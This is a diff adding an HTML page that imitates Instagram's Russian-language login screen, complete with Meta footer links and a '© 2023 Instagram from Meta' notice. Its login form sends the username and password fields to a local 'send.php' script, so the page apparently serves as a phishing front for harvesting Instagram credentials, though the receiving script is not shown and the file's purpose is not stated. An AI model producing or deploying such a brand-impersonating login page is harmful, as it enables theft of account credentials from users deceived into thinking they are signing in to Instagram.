@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web-страница с Bootstrap и Slick Slider</title>
+    <!-- Подключение Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <!-- Подключение Slick Slider CSS -->
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.css"/>
+    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick-theme.css"/>
+    <!-- Ваши стили -->
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container mt-5">
+        <div class="row">
+            <!-- Левая колонка с Slick Slider -->
+            <div class="col-md-6 slider_block" style="padding:0";>
+                <div class="phone-frame">
+                    <!-- Вставка Slick Slider -->
+                    <div class="slider">
+                        <div><img src="img/screenshot1.png" alt="Slide 1"></div>
+                        <div><img src="img/screenshot2.png" alt="Slide 2"></div>
+                        <div><img src="img/screenshot3.png" alt="Slide 3"></div>
+                        <div><img src="img/screenshot4.png" alt="Slide 3"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Правая колонка с формой авторизации -->
+            <div class="col-md-6" style="padding-left: 30px;">
+                <div class="border_block">
+                    <form action="send.php" method="post">
+                        
+                        <div class="logo"></div>
+
+                        <div class="input-group"> 
+                            <input type="text" autocomplete="off" name="login" required>
+                            <label class="placeholder">Телефон, имя пользователя или эл. адрес</label> 
+                        </div>
+
+                        <div class="input-group"> 
+                            <input type="password" autocomplete="off" name="password" required>
+                            <label class="placeholder">Пароль</label> 
+                        </div>
+
+                        <button type="submit" class="btn btn-primary enter">Войти</button>
+
+                        <div class="d-flex justify-content-between align-items-center w-100 mt-3">                    
+                            <div class="separate"></div>            
+                            <div class="separate_or">или</div>            
+                            <div class="separate"></div>
+                        </div>
+
+                        <div class="d-flex justify-content-center align-items-center w-100 mt-4">                    
+                            <div class="enter_fb_icon"></div>                   
+                            <div class="enter_fb">Войти через Facebook</div>
+                        </div>
+                        <div class="d-flex justify-content-center align-items-center w-100 mt-4">    
+                            <div class="forgot_password">Забыли пароль?</div>
+                        </div>
+
+                    </form>
+
+                </div>
+                <div class="border_block">
+                    <span class="reg_label">У вас ещё нет аккаунта?</span>
+                    <span class="reg" >Зарегистрироваться</span>
+                </div>
+                <div class="noborder_block">
+                    <span class="reg_label">Установите приложение.</span>                     
+                    <div class="d-flex justify-content-center align-items-center w-100 mt-1"> 
+                        <div class="gp"></div>   
+                        <div class="ms"></div>   
+                    </div>
+                </div>
+            
+            </div>
+        </div>
+    </div>
+
+    <div class="d-flex justify-content-center align-items-center w-100 mt-1 bottom_links"> 
+        <div class="">Meta</div>   
+        <div class="">Информация</div>  
+        <div class="">Блог</div>  
+        <div class="">Вакансии</div>  
+        <div class="">Помощь</div>  
+        <div class="">API</div>  
+        <div class="">Конфиденциальность</div>  
+        <div class="">Условия</div>  
+        <div class="">Места</div>   
+        <div class="">Instagram Lite</div>   
+        <div class="">Threads</div>   
+        <div class="">Загрузка контактов и лица, не являющиеся пользователями</div>   
+        <div class="">Meta Verified</div>   
+    </div>
+
+    <div class="d-flex justify-content-center align-items-center w-100 mt-1 mb-5 footer">   
+        <div class="">Русский</div>   
+        <div class="">© 2023 Instagram from Meta</div>   
+    </div> 
+
+    <!-- Подключение Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <!-- Подключение Slick Slider JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>
+    <!-- Ваш скрипт для активации Slick Slider -->
+    <script src="script.js"></script>
+</body>
+    
+
+</html>
